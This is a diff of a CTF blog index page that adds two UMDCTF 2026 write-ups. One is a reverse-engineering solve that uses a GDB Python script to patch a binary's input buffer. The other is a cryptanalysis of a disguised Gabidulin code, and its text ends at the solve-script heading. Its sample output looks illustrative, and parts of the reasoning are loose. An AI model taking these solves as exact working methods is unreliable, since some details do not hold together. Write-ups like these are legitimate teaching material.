@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">263</span>
+          <span class="site-state-item-count">265</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,515 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umdctf2026/umdctf2026-roulette/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umdctf2026/umdctf2026-roulette/" class="post-title-link" itemprop="url">UMDCTF 2026 - roulette [reverse]</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-26 10:20:00" itemprop="dateCreated datePublished" datetime="2026-04-26T10:20:00+08:00">2026-04-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-05-24 09:20:57" itemprop="dateModified" datetime="2026-05-24T09:20:57+08:00">2026-05-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umdctf2026/umdctf2026-roulette/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umdctf2026/umdctf2026-roulette/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p><strong>Challenge:</strong> roulette (Reverse Engineering)
+<strong>Category:</strong> reverse</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>The binary presents itself as a roulette game. You pick a number, and
+it tells you if you won. But that's just a facade — the real challenge
+is a hidden 106-byte input verifier powered by a tiny virtual machine.
+Each 4-byte chunk of your input is fed through a 27-round VM program
+that computes a checksum and compares it against a hardcoded target. If
+all 27 rounds pass, you get the success message and the flag.</p>
+<p>The clever solution? Don't reverse-engineer the VM at all. Use GDB
+with a Python breakpoint script at the critical compare instruction to
+dynamically extract what each input chunk should be.</p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>Running the binary with no arguments shows a simple betting
+prompt:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./roulette</span><br><span class="line">Welcome to the Roulette table!</span><br><span class="line">Place your bet (1-36): 7</span><br><span class="line">You lost! The winning number was 23</span><br></pre></td></tr></table></figure>
+<p>The input is parsed via <code>strtol</code>. If you enter
+<code>1</code>, you get a "jackpot" message. Enter anything outside 1-36
+and it says "invalid." This is all a decoy — none of this path leads to
+the flag.</p>
+<h2 id="finding-the-real-gate">Finding the Real Gate</h2>
+<p>Looking at <code>sub_401690</code> (main) in a disassembler, we see
+the strtol path branches into the roulette game. But there's another
+path: if you provide input longer than a typical number, something
+happens. Specifically:</p>
+<ul>
+<li><strong>Address <code>0x401751</code></strong>: A <code>cmp</code>
+checks if <code>strlen(input) == 106</code>. If so, execution diverts to
+a completely different handler — the real verifier.</li>
+<li><strong>Address <code>0x4018fe</code></strong>: The critical compare
+— <code>cmp (eax ^ edi), target</code>. This is where each round's
+computed check value is compared.</li>
+<li><strong>Address <code>0x401956</code></strong>: The success /
+"accepted" path if all checks pass.</li>
+</ul>
+<p>So the binary expects exactly 106 bytes of input. Those 106 bytes are
+processed in 4-byte chunks through 27 rounds of a VM program.</p>
+<h2 id="the-vm-internals">The VM Internals</h2>
+<p>The VM program is stored at <code>0x499BE1</code> and the round
+targets at <code>0x499CE0</code>. Each round runs a small sequence of
+bytecode instructions operating on the current 4-byte chunk. The
+operations include:</p>
+<ul>
+<li><code>COPY</code> — copy a value between registers</li>
+<li><code>XOR</code> — xor two values</li>
+<li><code>ADD</code> — add immediate or register</li>
+<li><code>MUL</code> — multiply by immediate</li>
+<li><code>ROL</code> / <code>SHR</code> — rotate left or shift
+right</li>
+</ul>
+<p>Each round produces a 32-bit check value in <code>eax</code>. At the
+compare site (<code>0x4018fe</code>), the assembly does:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4018fe: cmp (eax ^ edi), target</span><br></pre></td></tr></table></figure>
+<p>Where <code>edi</code> holds the current 4-byte input chunk,
+<code>eax</code> is the VM's computed checksum of that chunk, and
+<code>target</code> is the round's expected value from the target
+table.</p>
+<p>The full formula is:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(eax ^ chunk) == target</span><br><span class="line">=&gt; chunk = target ^ eax</span><br></pre></td></tr></table></figure>
+<p>So if we can extract both <code>eax</code> and <code>target</code>
+for each round, computing the required chunk is trivial.</p>
+<h2 id="the-smart-approach-gdb-python-scripting">The Smart Approach: GDB
+Python Scripting</h2>
+<p>Rather than fully reverse-engineering the VM interpreter, we can do
+something much simpler: set a breakpoint at <code>0x4018fe</code> and
+write a Python GDB script that:</p>
+<ol type="1">
+<li>Reads <code>eax</code> — the VM-computed checksum for the current
+round</li>
+<li>Reads <code>edi</code> — our current input chunk (which we
+control)</li>
+<li>Reads the round target from the target table</li>
+<li>Computes <code>required_chunk = target ^ eax</code></li>
+<li>Patches our input buffer in memory with the correct chunk</li>
+<li>Continues execution to the next round</li>
+</ol>
+<p>Since each round's VM computation depends on the input chunk itself,
+we need to iterate: patch chunk 0, let the VM run round 0, extract the
+result for round 1, patch chunk 1, and so on through all 27 rounds.</p>
+<p>Here's the script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable confirmation prompts</span></span><br><span class="line">gdb.execute(<span class="string">&quot;set confirm off&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Round targets stored at 0x499CE0 (array of 27 uint32s)</span></span><br><span class="line">TARGET_TABLE = <span class="number">0x499CE0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Our input buffer — we&#x27;ll read its address from RDI on first break</span></span><br><span class="line">input_buf = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_target</span>(<span class="params">round_idx</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Read the round target from the target table.&quot;&quot;&quot;</span></span><br><span class="line">    addr = TARGET_TABLE + round_idx * <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(</span><br><span class="line">        gdb.selected_inferior().read_memory(addr, <span class="number">4</span>), <span class="string">&#x27;little&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RouletteBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">&quot;*0x4018fe&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.done_first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> input_buf</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Get register values</span></span><br><span class="line">        eax = <span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$eax&quot;</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        edi = <span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$edi&quot;</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.done_first:</span><br><span class="line">            <span class="comment"># First hit — discover input buffer address from rdi</span></span><br><span class="line">            input_buf = <span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$rdi&quot;</span>)) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">            <span class="variable language_">self</span>.done_first = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        target = get_target(<span class="variable language_">self</span>.<span class="built_in">round</span>)</span><br><span class="line">        chunk_idx = <span class="variable language_">self</span>.<span class="built_in">round</span></span><br><span class="line">        chunk_offset = chunk_idx * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Compute what our chunk SHOULD be</span></span><br><span class="line">        required_chunk = (target ^ eax) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read what&#x27;s currently at that position</span></span><br><span class="line">        current_chunk = <span class="built_in">int</span>.from_bytes(</span><br><span class="line">            gdb.selected_inferior().read_memory(input_buf + chunk_offset, <span class="number">4</span>),</span><br><span class="line">            <span class="string">&#x27;little&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[Round <span class="subst">&#123;self.<span class="built_in">round</span>&#125;</span>]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  eax       = 0x<span class="subst">&#123;eax:08x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  edi       = 0x<span class="subst">&#123;edi:08x&#125;</span> (current chunk)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  target    = 0x<span class="subst">&#123;target:08x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  required  = 0x<span class="subst">&#123;required_chunk:08x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Patch the input buffer with the correct chunk</span></span><br><span class="line">        chunk_bytes = required_chunk.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        gdb.selected_inferior().write_memory(</span><br><span class="line">            input_buf + chunk_offset, chunk_bytes</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  patched   = <span class="subst">&#123;chunk_bytes!r&#125;</span> -&gt; &#x27;<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> chunk_bytes)&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.<span class="built_in">round</span> &gt;= <span class="number">27</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[All rounds complete!]&quot;</span>)</span><br><span class="line">            <span class="comment"># Read the full flag from memory</span></span><br><span class="line">            flag = <span class="built_in">bytes</span>(</span><br><span class="line">                gdb.selected_inferior().read_memory(input_buf, <span class="number">106</span>)</span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># don&#x27;t stop, just log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the binary</span></span><br><span class="line">gdb.execute(<span class="string">&quot;file ./roulette&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up the breakpoint</span></span><br><span class="line">bp = RouletteBreakpoint()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run with a dummy 106-byte input</span></span><br><span class="line"><span class="comment"># (the content doesn&#x27;t matter — we&#x27;ll patch it)</span></span><br><span class="line">dummy = <span class="string">&quot;A&quot;</span> * <span class="number">106</span></span><br><span class="line">gdb.execute(<span class="string">f&quot;run &lt;&lt;&lt; &#x27;<span class="subst">&#123;dummy&#125;</span>&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="running-the-script">Running the Script</h2>
+<p>Save the script as <code>solve_roulette.py</code> and run:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -x solve_roulette.py -batch</span><br></pre></td></tr></table></figure>
+<p>The script runs through all 27 rounds. On each iteration, you'll see
+output like:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Round 0]</span><br><span class="line">  eax       = 0x3a6f7b2c</span><br><span class="line">  edi       = 0x41414141 (current chunk)</span><br><span class="line">  target    = 0xdeadbeef</span><br><span class="line">  required  = 0xe4d6c518</span><br><span class="line">  patched   = b&#x27;\x18\xc5\xd6\xe4&#x27; -&gt; &#x27;...&#x27;</span><br><span class="line">...</span><br><span class="line">[All rounds complete!]</span><br><span class="line">FLAG: UMDCTF&#123;**************************************************************************************************&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="flag">Flag</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF&#123;I_R3ALLY-want-to-pl4y-the-p0werball,+but-my-d4d-said-no-so-im-b3tting-ill-win-on-POLYMARKETinstead&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umdctf2026/umdctf2026-weave/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umdctf2026/umdctf2026-weave/" class="post-title-link" itemprop="url">UMDCTF 2026 - Weave</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-26 10:10:00" itemprop="dateCreated datePublished" datetime="2026-04-26T10:10:00+08:00">2026-04-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-05-24 12:11:38" itemprop="dateModified" datetime="2026-05-24T12:11:38+08:00">2026-05-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umdctf2026/umdctf2026-weave/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umdctf2026/umdctf2026-weave/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>The weavers of the Gabidulin code have woven a disguise. But the
+shuttle leaves a trace, and the frays can only hide so much. Unravel the
+warp to find the secret.</p>
+</blockquote>
+<blockquote>
+<p>加比杜林码的织者们编织了一层伪装。但梭子留下了痕迹，毛边只能遮掩有限的信息。解开经线，找到秘密。</p>
+</blockquote>
+<p><strong>Challenge files:</strong> <code>challenge.sage</code>
+providing the public parameters <code>warp</code>, <code>bolt</code>,
+<code>shuttle</code>, <code>knot</code>, <code>pegs</code>,
+<code>N</code>, <code>K</code>, and an AES-GCM encrypted flag.</p>
+<h2 id="前置知识">前置知识</h2>
+<p>本题涉及<strong>秩度量码（Rank-Metric
+Codes）</strong>，属于编码论（Coding
+Theory）在秩度量下的分支。以下概念有助于理解：</p>
+<table>
+<colgroup>
+<col style="width: 31%" />
+<col style="width: 68%" />
+</colgroup>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>有限域 GF(2^43)</td>
+<td>扩体，每个元素可看作 43-bit 向量</td>
+</tr>
+<tr>
+<td>Frobenius 自同构</td>
+<td>σ(x) = x²，Gabidulin 生成矩阵的构建基础</td>
+</tr>
+<tr>
+<td>秩距离 vs Hamming 距离</td>
+<td>前者看矩阵的秩，后者数不同符号个数</td>
+</tr>
+<tr>
+<td>Reed-Solomon 码</td>
+<td>消息→多项式求值→码字，Gabidulin 的类比基础</td>
+</tr>
+<tr>
+<td>Gabidulin 码</td>
+<td>RS 在秩度量下的对应：线性化多项式 + Moore 矩阵</td>
+</tr>
+<tr>
+<td>MRD 特性</td>
+<td>最小秩距离 d = N - K + 1，解码半径 t = ⌊(N-K)/2⌋</td>
+</tr>
+<tr>
+<td>积秩攻击</td>
+<td>rank(A·B) ≤ rank_F₂(A) × dim(span(B))</td>
+</tr>
+</tbody>
+</table>
+<h2 id="gabidulin-codes-in-a-nutshell">Gabidulin Codes in a
+Nutshell</h2>
+<p>A Gabidulin code is a linear rank-metric code over an extension field
+<span class="math inline">\(\mathbb{F}_{q^m}\)</span>. Its generator
+matrix is a Vandermonde-like matrix (called a <strong>Moore
+matrix</strong>) built from linearly independent elements <span
+class="math inline">\(g_0, \dots, g_{N-1} \in
+\mathbb{F}_{q^m}\)</span>:</p>
+<p><span class="math display">\[
+G = \begin{pmatrix}
+g_0 &amp; g_1 &amp; \cdots &amp; g_{N-1} \\
+g_0^{[1]} &amp; g_1^{[1]} &amp; \cdots &amp; g_{N-1}^{[1]} \\
+\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
+g_0^{[K-1]} &amp; g_1^{[K-1]} &amp; \cdots &amp; g_{N-1}^{[K-1]}
+\end{pmatrix}
+\]</span></p>
+<p>where <span class="math inline">\(x^{[i]} = x^{q^i}\)</span> is the
+<span class="math inline">\(i\)</span>-th Frobenius power. Gabidulin
+codes can uniquely decode up to <span
+class="math inline">\(\left\lfloor\frac{N-K}{2}\right\rfloor\)</span>
+rank errors, making them the rank-metric analogue of Reed-Solomon
+codes.</p>
+<p><strong>Key difference from RS:</strong> RS uses distinct evaluation
+points and counts symbol errors (Hamming distance). Gabidulin uses <span
+class="math inline">\(\mathbb{F}_q\)</span>-linearly independent
+evaluation points and measures error by rank — meaning an error vector
+like <span class="math inline">\((e, e, e, \dots, e)\)</span> has rank 1
+even if every symbol is wrong.</p>
+<h2 id="the-challenge-disguise">The Challenge Disguise</h2>
+<p>The challenge constructs a <strong>loom</strong> — the true Gabidulin
+generator matrix over <span
+class="math inline">\(\mathbb{F}_{2^{43}}\)</span> with parameters <span
+class="math inline">\(N=40\)</span>, <span
+class="math inline">\(K=8\)</span>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loom = Matrix(Fqm, K, N, <span class="keyword">lambda</span> j, i: qpow(pegs[i], j))</span><br></pre></td></tr></table></figure>
+<p>Here <code>pegs</code> are <span class="math inline">\(N\)</span>
+linearly independent elements of <span
+class="math inline">\(\mathbb{F}_{2^{43}}\)</span>. The codeword is
+<span class="math inline">\(s \cdot \mathsf{loom}\)</span> where <span
+class="math inline">\(s \in \mathbb{F}_{2^{43}}^K\)</span> is the secret
+message.</p>
+<p>The disguise is a similarity transform:</p>
+<p><span class="math display">\[
+\mathsf{warp} = \mathsf{knot} \cdot \mathsf{loom} \cdot
+\mathsf{shuttle}^{-1}
+\]</span></p>
+<p><span class="math display">\[
+\mathsf{bolt} = s \cdot \mathsf{warp} + \mathsf{frays}
+\]</span></p>
+<p>All matrices <span class="math inline">\(\mathsf{knot}\)</span>,
+<span class="math inline">\(\mathsf{shuttle}\)</span>, and the list of
+<code>pegs</code> are <strong>published</strong> to the player. At first
+glance this seems to completely mask the underlying Gabidulin structure
+— but the key insight is that when the attacker knows the masking
+matrices, the disguise is <strong>fully reversible</strong>.</p>
+<h2 id="the-key-insight-low-rank-structure-of-the-masking">The Key
+Insight: Low-Rank Structure of the Masking</h2>
+<p>The vulnerability comes from how <span
+class="math inline">\(\mathsf{shuttle}\)</span> is constructed. Its
+entries are drawn from the span of only <code>FIBER_D=3</code> linearly
+independent elements over <span
+class="math inline">\(\mathbb{F}_{2^{43}}\)</span>. This means:</p>
+<p><span class="math display">\[
+\mathsf{shuttle} \in \mathsf{Span}\{\alpha_1, \alpha_2, \alpha_3\}^{N
+\times N}
+\]</span></p>
+<p>Consequently, multiplying an error vector by <span
+class="math inline">\(\mathsf{shuttle}^{-1}\)</span> is
+<strong>not</strong> well-defined over the integers — but multiplying
+<span class="math inline">\(\mathsf{bolt}\)</span> by <span
+class="math inline">\(\mathsf{shuttle}\)</span> is the right
+direction:</p>
+<p><span class="math display">\[
+\mathsf{bolt} \cdot \mathsf{shuttle} = s \cdot \mathsf{knot} \cdot
+\mathsf{loom} + \mathsf{frays} \cdot \mathsf{shuttle}
+\]</span></p>
+<p>Let <span class="math inline">\(s&#39; = s \cdot
+\mathsf{knot}\)</span> and <span class="math inline">\(\mathsf{error} =
+\mathsf{frays} \cdot \mathsf{shuttle}\)</span>.</p>
+<p>The error <span class="math inline">\(\mathsf{frays}\)</span> has
+rank at most <code>FRAYS=5</code> over <span
+class="math inline">\(\mathbb{F}_2\)</span> (not over <span
+class="math inline">\(\mathbb{F}_{2^{43}}\)</span> — this is a much
+stronger constraint, because <span
+class="math inline">\(\mathbb{F}_{2^{43}}\)</span> elements unfold to
+43-bit vectors over <span class="math inline">\(\mathbb{F}_2\)</span>).
+And because <span class="math inline">\(\mathsf{shuttle}\)</span>
+entries come from a 3-dimensional subspace, the product <span
+class="math inline">\(\mathsf{frays} \cdot \mathsf{shuttle}\)</span> has
+rank at most:</p>
+<p><span class="math display">\[
+\mathsf{rank}(\mathsf{frays} \cdot \mathsf{shuttle}) \le \mathsf{FRAYS}
+\cdot \mathsf{FIBER\_D} = 5 \times 3 = 15
+\]</span></p>
+<p><strong>Why this inequality holds:</strong> Write <span
+class="math inline">\(\mathsf{shuttle} = \sum_{t=1}^{3} b_t \cdot
+S^{(t)}\)</span> where <span class="math inline">\(b_t\)</span> are the
+subspace basis and <span class="math inline">\(S^{(t)}\)</span> have
+<span class="math inline">\(\mathbb{F}_2\)</span> entries. Then <span
+class="math inline">\(\mathsf{frays} \cdot \mathsf{shuttle} = \sum b_t
+\cdot (\mathsf{frays} \cdot S^{(t)})\)</span>, a sum of 3 matrices each
+with <span class="math inline">\(\mathbb{F}_2\)</span>-rank ≤ 5. The
+product rank is bounded by <span class="math inline">\(5 \times 3 =
+15\)</span>.</p>
+<p>The Gabidulin unique decoding radius for <span
+class="math inline">\(N=40, K=8\)</span> is:</p>
+<p><span class="math display">\[
+\left\lfloor\frac{40 - 8}{2}\right\rfloor = 16
+\]</span></p>
+<p>Since <span class="math inline">\(15 &lt; 16\)</span>, the error is
+<strong>within the unique decoding radius</strong>. We can recover <span
+class="math inline">\(s&#39;\)</span> uniquely.</p>
+<h2 id="solution">Solution</h2>
+<p>The solve script is straightforward:</p>
+<ol type="1">
+<li><p><strong>Remove the disguise:</strong> Compute <span
+class="math inline">\(\mathsf{received} = \mathsf{bolt} \cdot
+\mathsf{shuttle}\)</span> to obtain a true Gabidulin codeword plus
+low-rank error.</p></li>
+<li><p><strong>Build the original loom:</strong> Reconstruct <span
+class="math inline">\(\mathsf{loom}\)</span> from <code>pegs</code>
+using the same lambda.</p></li>
+<li><p><strong>Decode:</strong> Use a Gabidulin decoder (e.g., the
+Gao-style decoder or the standard rank-metric syndrome decoder) to
+recover <span class="math inline">\(s&#39;\)</span> from <span
+class="math inline">\(\mathsf{received}\)</span> given <span
+class="math inline">\(\mathsf{loom}\)</span>.</p></li>
+<li><p><strong>Recover the secret:</strong> Multiply by <span
+class="math inline">\(\mathsf{knot}^{-1}\)</span>: <span
+class="math display">\[s = s&#39; \cdot
+\mathsf{knot}^{-1}\]</span></p></li>
+<li><p><strong>Derive the AES key:</strong> Hash the secret's byte
+representation with SHA-256 and take the first 16 bytes:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = sha256(secret_bytes).digest()[:<span class="number">16</span>]</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>Decrypt the flag:</strong> Use AES-GCM with this key and
+the nonce/tag provided in the challenge output.</p></li>
+</ol>
+<h2 id="solve-script">Solve Script</h2>
